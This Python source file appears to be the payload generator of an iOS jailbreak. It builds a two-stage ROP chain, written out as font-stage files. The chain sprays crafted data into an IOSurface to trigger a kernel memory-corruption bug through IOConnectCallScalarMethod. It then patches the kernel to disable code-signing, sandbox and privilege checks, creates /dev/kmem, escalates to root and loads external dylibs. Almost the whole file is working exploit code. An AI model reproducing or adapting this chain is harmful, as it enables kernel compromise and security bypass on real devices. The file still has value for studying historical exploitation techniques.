#!/opt/local/bin/python2.6
# Crap, crap, crap.
# Here's an idea (not a bad one even): During the screen on case, actually draw the stuff on the screen, usleep(100000), use the atboot version
import struct, sys, os, re, anydbm, traceback
import warnings
warnings.simplefilter('error')

os.chdir(os.path.dirname(os.path.abspath(sys.argv[0])))

import config
cfg = config.openconfig()
cache = cfg['#cache']
kern = cfg['#kern']
syms = config.binary_open(cache['@binary'])

dontcare = 0

heapdbg = False

def init(*regs):
    global fwds, heapstuff
    fwds = {}
    heapstuff = map(fwd, regs)

def heapadd(*stuff):
    global heapstuff
    if heapdbg:
        heapstuff.append(''.join(traceback.format_stack()))
    heapstuff += list(stuff)

def finalize(heapaddr_=None):
    global heapstuff, hidx, sheap, sheapaddr, heapaddr
    clear_fwd()
    heapaddr = heapaddr_
    if heapaddr is not None:
        sheapaddr = heapaddr + 4*len(heapstuff)
        print 'sheapaddr = %x'% sheapaddr
    sheap = ''
    for pass_num in xrange(2):
        for hidx in xrange(len(heapstuff)):
            thing = heapstuff[hidx]
            if heapdbg and isinstance(thing, basestring): continue
            if not isinstance(thing, int):
                try:
                    thing = int(thing)
                except NotYetError:
                    pass
                else:
                    heapstuff[hidx] = thing
    if heapdbg:
        for i in heapstuff:
            if isinstance(i, basestring):
                print i
            else:
                print hex(i)
        sys.exit(1)

    return struct.pack('<'+'I'*len(heapstuff), *heapstuff) + sheap

def clear_fwd():
    global fwds
    for a in fwds.values():
        a.val = dontcare
    fwds = {}
def exhaust_fwd(*names):
    for name in names:
        if fwds.has_key(name):
            fwds[name].val = dontcare
            del fwds[name]
def set_fwd(name, val):
    assert fwds.has_key(name) and val is not None
    fwds[name].val = val
    del fwds[name]
class fwd:
    def __init__(self, name, force=False):
        if force:
            if fwds.has_key(name): exhaust_fwd(name)
        else:
            assert not fwds.has_key(name)
        fwds[name] = self
        self.val = None
    def __int__(self):
        assert self.val is not None
        return int(self.val)
    def __repr__(self):
        return '<fwd: %s>' % self.val
class NotYetError(Exception): pass
class car:
    def __int__(self):
        if not hasattr(self, '_val'):
            self._val = int(self.val())
        return self._val
    def __add__(self, other):
        return later(lambda: (int(self) + int(other)) % (2**32))
    def __sub__(self, other):
        return later(lambda: (int(self) - int(other)) % (2**32))
    def __radd__(self, other):
        return later(lambda: (int(other) - int(self)) % (2**32))
    def __rsub__(self, other):
        return later(lambda: (int(other) - int(self)) % (2**32))
    def __mul__(self, other):
        return later(lambda: (int(self) * int(other)) % (2**32))
    def __rmul__(self, other):
        return later(lambda: (int(other) * int(self)) % (2**32))
    def __and__(self, other):
        return later(lambda: (int(self) & int(other)) % (2**32))
    def __len__(self):
        return int(self)
class sp_off(car):
    def val(self):
        return 4*hidx

class stackunkwrapper(car):
    def __init__(self, wrapped):
        self.wrapped = wrapped
    def val(self):
        global heapaddr
        self.addr = heapaddr + 4*hidx
        return int(self.wrapped)
class stackunk(car):
    def val(self):
        global heapaddr
        self.addr = heapaddr + 4*hidx
        return 0
class stackunkptr(car):
    def __init__(self, unk):
        self.unk = unk
    def val(self):
        if not hasattr(self.unk, 'addr'): raise NotYetError
        return self.unk.addr
# [0] evaluates to 0, [1] evaluates to the address of [0]
def stackunkpair():
    unk = stackunk()
    unkptr = stackunkptr(unk)
    return unk, unkptr

class ptrI(car):
    def __init__(self, *args):
        self.args = args
    def val(self):
        global sheapaddr, sheap
        self.args = map(int, self.args)
        q = struct.pack('I'*len(self.args), *self.args)
        ret = sheapaddr + len(sheap)
        sheap += q
        while len(sheap) % 4 != 0: sheap += '\0'
        return ret
    
class ptr(car):
    def __init__(self, str, null_terminate=False):
        self.str = str
        self.null_terminate = null_terminate
    def __len__(self):
        return len(self.str)
    def val(self):
        global sheapaddr, sheap
        ret = sheapaddr + len(sheap)
        sheap += self.str
        if self.null_terminate: sheap += '\0'
        while len(sheap) % 4 != 0: sheap += '\0'
        return ret

class later(car):
    def __init__(self, func):
        self.func = func
    def val(self):
        return self.func()

# useful addresses for debugging (iPad1,1_3.2):
# 0x30a8846e end of c_ch
# 0x30a88a70 index
# 0x30a8876e drop
# 0x30a8a074 just before popout

#POP.W   {R8,R10,R11}
#POP     {R4-R7,PC}

# stage1: memcpy stack <- r1+something

def load_r0_base_sp_off(off): 
    # note blah: "add r0, sp, #600" is based off of the SP now
    # sp_off() is based off of the SP-off of R4, which (with make_r4_avail) is 8 less
    # this is a hack.
    make_r4_avail()
    exhaust_fwd('R7')
    set_fwd('PC', cache['k13'])
    set_fwd('R4', (off - 8 - 600) - sp_off())
    heapadd(fwd('R1'), dontcare, cache['k14'],
            fwd('R4'), fwd('R7'), fwd('PC'))

def load_r0_r0():
    set_fwd('PC', cache['k4'])
    exhaust_fwd('R4', 'R5', 'R7')
    heapadd(fwd('R4'), fwd('R5'), fwd('R7'), fwd('PC'))

def load_r0_from(address):
    set_fwd('PC', cache['k16'])
    set_fwd('R4', address)
    exhaust_fwd('R7')
    heapadd(fwd('R4'), fwd('R7'), fwd('PC'))

def store_r0_to(address):
    set_fwd('PC', cache['k5'])
    set_fwd('R4', address)
    exhaust_fwd('R7')
    heapadd(fwd('R4'), fwd('R7'), fwd('PC'))

def add_r0_const(addend):
    set_fwd('PC', cache['k6'])
    set_fwd('R4', addend)
    exhaust_fwd('R7')
    heapadd(fwd('R4'), fwd('R7'), fwd('PC'))

def set_r0to3(r0, r1, r2, r3):
    set_fwd('PC', cache['k7'])
    heapadd(r0, r1, r2, r3, fwd('PC'))

def set_r1to2(r1, r2):
    set_fwd('PC', cache['k8'])
    heapadd(r1, r2, fwd('PC'))

def set_r1to3(r1, r2, r3):
    set_fwd('PC', cache['k9'])
    heapadd(r1, r2, r3, fwd('PC'))

def set_sp(sp):
    set_fwd('PC', cache['k10'])
    set_fwd('R7', sp)
    clear_fwd() # pop {r7, pc} but that's not in this stack

# Make some registers available but do nothing.
def make_avail():
    set_fwd('PC', cache['k11'])
    heapadd(*(fwd(i, True) for i in ['R4', 'R5', 'R6', 'R7', 'PC']))

# Make only r4 available.
def make_r4_avail():
     set_fwd('PC', cache['k18'])
     exhaust_fwd('R4')
     heapadd(fwd('R4'), fwd('PC'))

def funcall(funcname, *args, **kwargs):
    if isinstance(funcname, basestring):
        funcaddr = syms[funcname]
        #if funcname != '_execve': funcaddr |= 1
        #if funcaddr & 1 == 0:
        #    print funcname, 'non-thumb'
    else:
        funcaddr = funcname
    while len(args) < 4: args += (dontcare,)
    if args[0] is None:
        set_r1to3(args[1], args[2], args[3])
    else:
        set_r0to3(args[0], args[1], args[2], args[3])
    if kwargs.get('load_r0'):
        load_r0_r0()
        del kwargs['load_r0']
    assert kwargs == {}
    if len(args) <= 7:
        set_fwd('PC', cache['k12'])
        set_fwd('R4', funcaddr)
        exhaust_fwd('R5', 'R7')
        heapadd(fwd('R4'), fwd('R5'), fwd('R7'), fwd('PC'))
        if len(args) > 4:
            set_fwd('R4', args[4])
        if len(args) > 5:
            set_fwd('R5', args[5])
        if len(args) > 6:
            set_fwd('R7', args[6])
    else:
        set_fwd('PC', cache['k17'])
        set_fwd('R4', funcaddr)
        unk = stackunkwrapper(fwd('R4'))
        unkptr = stackunkptr(unk)
        set_fwd('R7', unkptr + 4)
        heapadd(*args[4:])
        heapadd(unk, fwd('R7'), fwd('PC'))

def set_sp(sp):
    set_fwd('PC', cache['k10'])
    set_fwd('R7', sp)
    heapadd(fwd('R7'), fwd('PC'))

def store_to_r0(value):
    set_fwd('R4', value)
    exhaust_fwd('R7')
    set_fwd('PC', cache['k15'])
    heapadd(fwd('R4'), fwd('R7'), fwd('PC'))


def store_deref_plus_offset(deref, offset, value):
    # [[deref],offset] = value
    load_r0_from(deref)
    add_r0_const(offset)
    store_to_r0(value)


def make_stage2(init_regs, is_boot, heapaddr):
    init(*init_regs)
    data, dataptr = stackunkpair()
    matching, matchingptr = stackunkpair()
    baseptr = ptrI(0)
    connect = ptrI(0)
    surface = ptrI(0)
    surface0 = ptrI(0)
    zero = ptrI(0)

    if not is_boot: make_avail()

    #funcall('_ptrace', 31, 0, 0, 0) # PT_DENY_ATTACH

    # These *are* mapped before being loaded, but initializers are not called -> crash
    funcall('_dlopen', ptr('/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface', True), 0)
    funcall('_dlopen', ptr('/System/Library/Frameworks/IOKit.framework/IOKit', True), 0)

    if is_boot:
        
        # This is for debugging.
        #q = ptr('\0\0\0\0')
        #store_r0_to(q)
        #funcall('_sysctlbyname', ptr('net.inet.ipsec.ah_offsetmask', True), 0, 0, q, 4)
        #make_avail()
    
        timespec = ptr('\0'*12)
        funcall('_IOKitWaitQuiet', 0, timespec)
    
    funcall('_IOServiceMatching', ptr(str(kern['rgbout']), True))
    store_r0_to(matchingptr)

    funcall('_mach_task_self')
    task, taskptr = stackunkpair()
    store_r0_to(taskptr)
    
    funcall('_IOServiceGetMatchingService', 0, matching)

    #funcall('_CFShow', None)
    #funcall('_abort')

    service, serviceptr = stackunkpair()
    store_r0_to(serviceptr)
    
    funcall('_IOServiceOpen', None, task, 0, connect)

    alloc_size, w = kern['adjusted_vram_baseaddr']
    r7s = kern['vram_baseaddr']
     
    h = kern['e1']
    
    scratch = kern['scratch'] + 0x100

    patches = [(kern[combo], kern[combo + '_to']) for combo in ['patch1', 'patch3', 'patch4', 'patchkmem0', 'patchkmem1', 'patch_cs_enforcement_disable', 'patch_proc_enforce', 'patch_nosuid']]

    # Make an IOSurface.
    bytes_per_row = (w * 4) & 0xffffffff
    my_plist = ptr('''
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>IOSurfaceAllocSize</key>
        <integer>%d</integer>
        <key>IOSurfaceBufferTileMode</key>
        <false/>
        <key>IOSurfaceBytesPerElement</key>
        <integer>4</integer>
        <key>IOSurfaceBytesPerRow</key>
        <integer>%d</integer>
        <key>IOSurfaceHeight</key>
        <integer>%d</integer>
        <key>IOSurfaceIsGlobal</key>
        <true/>
        <key>IOSurfaceMemoryRegion</key>
        <string>PurpleGfxMem</string>
        <key>IOSurfacePixelFormat</key>
        <integer>1095911234</integer>
        <key>IOSurfaceWidth</key>
        <integer>%d</integer>
    </dict>
    </plist>'''.replace('    ', '').replace('\n', '') % (alloc_size, bytes_per_row, h, w))

    funcall('_CFDataCreate', 0, my_plist, len(my_plist))
    store_r0_to(dataptr)
    kCFPropertyListImmutable = 0
    funcall('_CFPropertyListCreateFromXMLData', 0, data, kCFPropertyListImmutable, 0)
    funcall('_IOSurfaceCreate', None)
    store_r0_to(surface0)

    funcall('_IOSurfaceLookup', kern['root_ios_id'])
    store_r0_to(surface)

    funcall('_IOSurfaceLock', surface, 0, 0, load_r0=True)
    funcall('_IOSurfaceGetBaseAddress', surface, load_r0=True)
    store_r0_to(baseptr)

    #funcall('_wmemset', None, kern['e0'], alloc_size / 4)
    
    js = ptr(struct.pack('QQ', 0, 6))
    
    funcall('_IOSurfaceGetID', surface0, load_r0=True)
    store_r0_to(js)

    if not is_boot:
        patches.append((kern['patch_suser'], kern['patch_suser_to']))
        patches.append((kern['mac_policy_list'] + 8, 0))
        patches.append((kern['mac_policy_list'] + 12, 0))

    sandstuff = open('../sandbox/sandbox-mac-replace.bin').read()
    goop = open('goop.bin').read()
    sandstuff = sandstuff[:-16] + struct.pack('IIII', kern['strncmp'], kern['vn_getpath'], kern['mpo_vnode_check_open'], kern['mpo_vnode_check_access'])
    sandbase = scratch + 0x6c + len(goop) + 8*(len(patches) + 3)
    accessbase = sandbase + sandstuff.find(struct.pack('I', 0xacce5)) + 4
    copysize = sandbase + len(sandstuff) - scratch

    patches.append((kern['mpo_vnode_check_open_ptr'], sandbase | 1))
    patches.append((kern['mpo_vnode_check_access_ptr'], accessbase | 1))

    # R7, PC, dest is either sp + 0x34 or sp + 0x64
    # [0x38] = [0x68] = PC (scratch | 1)
    # [0x3c] = [0x6c] = scratch
    data = struct.pack('IIIIIII',
        # SP is here (0) during the bcopy
        copysize, # size
        # Scratch is copied from  here (4)
        ## The below is used as copied into scratch.
        0, 0, 0, # R8, R10, R11
        0, 0, 0, # R4, R5, R6
    )

    assert len(data) == 0x1c
    data += struct.pack('IIIIIIII',
        0, # R7 or R8
        (scratch + 0x6c) | 1, # PC or R10
        0, # R11
        0, 0, 0, 0, (scratch + 0x6c) | 1, # R4-R7, PC
    )
    
    assert len(data) == 0x3c
    #data += '\xee' * (0x3c - len(data))
    data += struct.pack('I', scratch)
    data += '\x99' * (0x4c - len(data))
    data += struct.pack('IIIIIIII', # ipt2g
        0, # R8
        0, # R10
        0, # R11
        0, 0, 0, 0, (scratch + 0x6c) | 1, # R4-R7, PC
    )
    assert len(data) == 0x6c
    #data += '\xee' * (0x6c - len(data))
    data += struct.pack('I', scratch)
    
    # this is 0x70 aka 4 + 0x6c
    data += goop[:-16]
    data += struct.pack('IIII',
        kern['current_thread'],
        kern['ipc_kobject_server_start'],
        kern['ipc_kobject_server_end'],
        len(patches)
    )

    for p, q in patches:
        data += struct.pack('II', q, p)

    data += struct.pack('II', 0xdead0001, 0xf00d0001) # just in case

    assert len(data) == 4 + sandbase - scratch
    data += sandstuff

    assert len(data) == 4 + copysize
    
    while len(data) % 4 != 0: data += '\0'

    open('/tmp/data', 'w').write(data[4:])

    #o = 0xc0458216 - scratch - 8 + 2 + 192; print '--', data[o+4:o+8].encode('hex')
    
    intro = struct.pack('II',
        #kern['e1']+4, # PC
        scratch + 0x18, # R7
        kern['e2'], # PC
    )

    print 'scratch=%08x copysize=%08x' % (scratch, copysize)

    pdata = ptr(intro + data)

    print 'I have', len(r7s), 'r7s'
    for r7 in r7s:
        load_r0_from(baseptr)
        add_r0_const(w - r7)
        funcall('_memcpy', None, pdata, len(intro) + len(data))

    funcall('_IOSurfaceUnlock', surface, 0, 0, load_r0=True)
    make_avail()
    #funcall('_abort')
    funcall('_IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)
    #print 'imo, IOConnectCallScalarMethod = %x' % syms['_IOConnectCallScalarMethod']
    make_avail()

    if not is_boot:
        funcall('_setuid', 0)
    
    funcall('_mknod', ptr('/dev/mem', True),  020600, 0x3000000)
    funcall('_mknod', ptr('/dev/kmem', True), 020600, 0x3000001)


    if not is_boot:
        kmem_ptr = ptrI(0)
        funcall('_open', ptr('/dev/kmem', True), 2) # O_RDWR
        store_r0_to(kmem_ptr)
        funcall('_pwrite', kmem_ptr, ptrI(kern['patch_suser_orig']), 4, kern['patch_suser'], 0, load_r0=True)
        funcall('_close', kmem_ptr, load_r0=True)

    funcall('_CFRelease', surface, load_r0=True)
    funcall('_CFRelease', surface0, load_r0=True)
    funcall('_IOServiceClose', connect, load_r0=True)
    funcall('_IOObjectRelease', service)

    if is_boot:
        make_avail()
        
        funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zero, 4)
        make_avail()
    
        launchd = ptr('/sbin/launchd', True)
        argp = ptrI(launchd, 0)
        envp = ptrI(ptr('DYLD_INSERT_LIBRARIES=', True), 0)
        funcall('_execve', launchd, argp, envp)
        funcall('_abort')
        #funcall('_perror', ptr('U fail!', True))
    else:
        make_avail()
       
        dylib = open('../installui/installui.dylib').read()

        O_WRONLY = 0x0001
        O_CREAT  = 0x0200
        O_TRUNC  = 0x0200

        tmpptr = ptr('/tmp/installui.dylib', True)

        fd, fdptr = stackunkpair()
        funcall('_open', tmpptr, O_WRONLY | O_CREAT | O_TRUNC, 0644)
        store_r0_to(fdptr)
        funcall('_write', None, ptr(dylib), len(dylib))
        funcall('_close', fd)

        RTLD_LAZY = 0x1
        sym, symptr = stackunkpair()
        funcall('_dlopen', tmpptr, RTLD_LAZY)
        funcall('_dlsym', None, ptr('iui_go', True))
        store_r0_to(symptr)
        #load_r0_from(connect)
        one = open('one.dylib').read()
        print 'one is %d bytes' % len(one)
        funcall(sym, 0xdeadbeed, ptr(one), len(one))

    return finalize(heapaddr)

def make_stage1():
    init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
    assert len(stage2) < 0x10000
    funcall('_mmap', mmap_addr, stackspace + len(stage2) + 4, 3, 0x1012, 0, 0, 0)
    # iPad1,1_3.2: -960
    # iPhone3,1_4.0: -964
    load_r0_base_sp_off(cache['magic_offset']) # trial and error
    store_r0_to(mmap_addr + stackspace + len(stage2))
    add_r0_const(0xdeadbeef) # Not a placeholder.  This is the length of the original program, which we want to skip. outcff handles this

    funcall('_bcopy', None, mmap_addr + stackspace, len(stage2))
    set_sp(mmap_addr + stackspace)
    heapadd(0xf00df00d) # searched for

    return finalize()

if __name__ == '__main__':
    mmap_addr = 0x09000000
    stackspace = 1024*1024
    stage2 = make_stage2(['R7', 'PC'], False, mmap_addr + stackspace)
    stage2 = stage2.replace(struct.pack('I', 0xdeadbeed), struct.pack('I', mmap_addr + stackspace + len(stage2)))
    stage1 = make_stage1()

    print len(stage1)/4, '/ 48' # should be (a few) less than 48

    open('../cff/stage1.txt', 'wb').write(stage1)
    open('../cff/stage2.txt', 'wb').write(stage2)

